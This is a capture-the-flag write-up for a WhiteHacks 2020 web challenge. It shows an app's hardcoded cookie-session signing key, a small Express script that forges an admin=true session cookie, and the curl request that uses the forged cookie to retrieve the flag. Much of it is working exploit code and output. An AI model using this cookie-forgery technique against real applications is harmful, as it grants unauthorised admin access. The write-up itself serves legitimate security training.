# PDF-C (2/3): Lookie Its A Cookie
Web

## Challenge 

DESCRIPTION
I hope the circuit breaker period made you a better baker, because you are going to have to bake your own cookies. Can you retrieve the second flag?

The website.zip here is the same as in part 1.

Visit the challenge at http://chals.whitehacks.ctf.sg:13003/

Author: waituck


ATTACHED FILES
website.zip

## Solution

In the source code, we see the session cookie key.

	app.use(cookieSession({
	  name: 'session',
	  keys: ['🎌💩💩💩💩🎌']
	}))


We need a session cookie to access /read_admin.

	app.get('/real_admin', (req, res) => {
	  if (req.session && req.session.admin === true) {
	    let flag = fs.readFileSync('flag2.txt').toString('utf8')
	    flag = `<h1>${flag}</h1>`
	    flag += '<br/> but you are still not a real admin :>, the real admin can run shell commands :)'
	    res.send(flag)
	  } else {
	    res.send('<h1 style="color:red;">your cookies taste awful!</h1>')
	  }
	})

I created my own version to produce a cookie with the value of admin=true..

	app.get('/', (req, res) => {
	  req.session.admin = true
	  res.end(req.session.admin + '.')
	});

Then ran it to get the cookie values.

	$ npm install cookie-session
	# npm install express
	$ node create_cookie.js 
	Running on http://0.0.0.0:8080

	$ curl http://127.0.0.1:8080 -v
	*   Trying 127.0.0.1:8080...
	* TCP_NODELAY set
	* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: 127.0.0.1:8080
	> User-Agent: curl/7.68.0
	> Accept: */*
	> 
	* Mark bundle as not supporting multiuse
	< HTTP/1.1 200 OK
	< X-Powered-By: Express
	< Set-Cookie: v path=/; httponly
	< Set-Cookie: session.sig=_xVjCLdo74nT98RCUcPQ3zCBkNQ; path=/; httponly
	< Date: Sun, 02 Aug 2020 05:04:28 GMT
	< Connection: keep-alive
	< Content-Length: 5
	< 
	* Connection #0 to host 127.0.0.1 left intact


Then used the values for the server

	$ curl http://chals.whitehacks.ctf.sg:13003/real_admin 
	--cookie "session=eyJhZG1pbiI6dHJ1ZX0=;session.sig=_xVjCLdo74nT98RCUcPQ3zCBkNQ;"

	<h1>WH2020{sw33_h3ng_bAk3ryy}</h1><br/> but you are still not a real admin :>, the real admin can run shell commands :)z

## Flag

	WH2020{sw33_h3ng_bAk3ryy}
